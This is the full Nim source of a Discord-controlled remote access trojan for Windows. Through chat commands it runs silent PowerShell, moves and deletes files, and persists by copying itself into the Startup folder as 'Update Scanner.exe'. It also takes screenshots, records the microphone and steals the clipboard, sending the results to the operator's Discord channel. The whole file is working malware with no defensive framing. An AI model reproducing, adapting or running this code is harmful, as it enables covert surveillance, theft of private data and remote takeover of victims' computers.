import utils/[audio, screenshot]

import dimscord, asyncdispatch, options, os, strutils, httpclient, streams, osproc
import winim/lean

let discord = newDiscordClient("TOKEN_HERE_TOKEN_HERE_TOKEN_HERE_TOKEN_HERE")

const helpMenu = """
**:video_game: Bot Control**
`.help` - show help menu
`.ping` - pings all clients
`.control <client/all>` - select target or all

**:file_folder: File Management**
`.upload <attachment>` - upload file(s) to server
`.download <path>` - download file from target 
`.remove <path>` - removes file specified

**:desktop: System**
`.shell <command>` - execute silent powershell command
`.ip` - retrieves clients ip adress
`.persist` - attempts to establish persistence

**:detective: Surveillance**
`.screenshot` - takes a screenshot and sends 
`.record <seconds>` - records mic for selected amount of seconds
`.clip` - sends clipboard content
"""

var targetUsername = getenv("username")
var selectedTarget: string

proc get_clipboard*(): string =
  defer: discard CloseClipboard()
  if OpenClipboard(0):
    let data = GetClipboardData(1)
    if data != 0:
      let text = cast[cstring](GlobalLock(data))
      discard GlobalUnlock(data)
      if text != NULL:
        var sanitized_text = ($text).replace("\c", "")
        return sanitized_text

proc onReady(s: Shard, r: Ready) {.event(discord).} =
    echo "Ready as " & targetUsername 

proc messageCreate(s: Shard, m: Message) {.event(discord).} =
    let content = m.content
    if (m.author.bot): return

    if (content == ".ping"):
        discard await discord.api.sendMessage(m.channel_id, "[+] Hello from **" & targetUsername & "**. " & $s.latency() & "ms")

    if (content.startsWith(".control")):
        var 
            messageContents = split(content, " ")

        try:
            selectedTarget = messageContents[1]
            if (selectedTarget == "all"):
                selectedTarget = targetUsername
            if (selectedTarget == targetUsername):
                discard await discord.api.sendMessage(m.channel_id, "[+] Selected Target : **" & selectedTarget & "**")

        except:
            discard await discord.api.sendMessage(m.channel_id, "[!!] No Target Selected")

    if (selectedTarget == targetUsername):
        if (content == ".help"):
            discard await discord.api.sendMessage(
                m.channel_id, 
                embeds = @[Embed(
                    title: some "Hello there!", 
                    description: some helpMenu,
                    color: some 0x490070
                )]
                )

        elif (content == ".download"):
            discard await discord.api.sendMessage(m.channel_id, "[*] Uploading...")
            for attachmentIndex, attachmentValue in m.attachments:
                var
                    filename = attachmentValue.filename
                    url = attachmentValue.url
                    client = newHttpClient()
                    response = client.get(url)
                    f = newFileStream(filename, fmWrite)
                f.write(response.body)
                f.close()
                discard await discord.api.sendMessage(m.channel_id, "[+] Uploaded **" & filename & "** to : **" & targetUsername & "**")
        
        elif (content.startsWith(".upload")):
            discard await discord.api.sendMessage(m.channel_id, "[*] Downloading...")
            try:
                var path = split(content, " ")[1]
                discard await discord.api.sendMessage(m.channel_id, "[+] Downloaded From : **" & targetUsername & "**", files = @[DiscordFile(name: path)])
            except:
                discard await discord.api.sendMessage(m.channel_id, "[!!] File Not Found")
        
        elif (content.startsWith(".record")):
            discard await discord.api.sendMessage(m.channel_id, "[*] Recording...")
            try:
                var time = content[8 .. content.high]
                record_mic(time.parseInt() + 1)
                discard await discord.api.sendMessage(m.channel_id, "[+] Recorded mic input for : **" & time & "** seconds.", files = @[DiscordFile(name: "recording.wav")])
                os.removeFile("recording.wav")
            except:
                discard await discord.api.sendMessage(m.channel_id, "[!!] Something went wrong! Did you input recording time?")
        
        elif (content == ".screenshot"):
            discard await discord.api.sendMessage(m.channel_id, "[*] Taking screenshot...")
            try:
                get_screenshot()
                discard await discord.api.sendMessage(m.channel_id, "[+] Screenshot from : **" & targetUsername & "**.", files = @[DiscordFile(name: "screenshot.png")])
                os.removeFile("screenshot.png")
            except:
                discard await discord.api.sendMessage(m.channel_id, "[!!] Something went wrong!")
        
        elif (content == ".persist"):
            discard await discord.api.sendMessage(m.channel_id, "[*] Attempting to establish persistence...")
            try:
                copyfile(getAppFilename(), r"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Update Scanner.exe")
                discard await discord.api.sendMessage(m.channel_id, "[*] Persistence established!")
            except CatchableError:
                discard await discord.api.sendMessage(m.channel_id, "[!!] Failed to establish persistence!")

        elif (content == ".clip"):
            discard await discord.api.sendMessage(m.channel_id, "[*] Getting clipboard...")
            try:
                var 
                  content = get_clipboard()
                  f = newFileStream("clipboard.txt", fmWrite)
                f.write(content)
                f.close()
                discard await discord.api.sendMessage(m.channel_id, "[+] Clipboard from : **" & targetUsername & "**.", files = @[DiscordFile(name: "clipboard.txt")])
                os.removeFile("clipboard.txt")
            except:
                discard await discord.api.sendMessage(m.channel_id, "[!!] Something went wrong!")

        elif (content.startswith(".shell")):
            discard await discord.api.sendMessage(m.channel_id, "Running command...")
            var 
                command = content[6 .. content.high]
                outp = execProcess("powershell.exe /c " & command , options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
            
            if outp.len() < 2000:
                try:
                    discard await discord.api.sendMessage(m.channel_id, "```" & outp & "```")
                except:
                    discard await discord.api.sendMessage(m.channel_id, "Ran : `" & command & "` on : **" & targetUsername & "** but no output was given.")
            else:
                var f = newFileStream("output.txt", fmWrite)
                f.write(outp)
                f.close()
                discard await discord.api.sendMessage(m.channel_id, "[+] Output from : **" & targetUsername & "**.", files = @[DiscordFile(name: "output.txt")])
                os.removeFile("output.txt")
        
        elif (content == ".ip"):
            var
              client = newHttpClient()
              ip_response = client.get("https://ipinfo.io/json")
              ipinfo = ip_response.body
            
            discard await discord.api.sendMessage(
                m.channel_id, 
                embeds = @[Embed(
                    title: some ":satellite: IP Info", 
                    description: some "```" & ipinfo & "```",
                    color: some 0x490070
                )]
                )

        elif (content.startsWith(".remove")):
            discard await discord.api.sendMessage(m.channel_id, "[*] Removing...")
            try:
                var path = split(content, " ")[1]
                os.removeFile(path)
                discard await discord.api.sendMessage(m.channel_id, "[+] Removed file **" & path & "** from **" & targetUsername & "**")
            except:
                discard await discord.api.sendMessage(m.channel_id, "[!!] File Not Found")

waitFor discord.startSession()